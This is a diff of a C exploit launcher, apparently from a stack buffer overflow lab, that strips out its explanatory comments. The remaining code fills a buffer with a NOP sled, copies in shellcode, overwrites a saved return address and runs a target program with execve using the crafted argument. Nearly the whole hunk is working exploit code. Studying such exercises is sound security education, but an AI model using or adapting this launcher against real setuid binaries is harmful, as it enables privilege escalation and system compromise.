@@ -16,27 +16,19 @@ int main(void)
   char *args[3];
   char *env[1];
 
-  // Create the exploit string
   char buf[OFFSET + 1];
-
-  // Add the NOP sled
   memset(buf, '\x90', sizeof(buf));
-
   buf[OFFSET] = 0;
-
-  // Add the shellcode
   memcpy(buf, shellcode, SHELLCODE_LENGTH);
 
   *(unsigned int*)(buf + OFFSET - 4) = RETURN_ADDRESS;
 
-  // Set up the arguments for execve
   args[0] = TARGET;
   args[1] = buf;
   args[2] = NULL;
 
   env[0] = NULL;
 
-  // Execute the target program with the exploit string
   execve(TARGET, args, env);
   fprintf(stderr, "execve failed.\n");
 
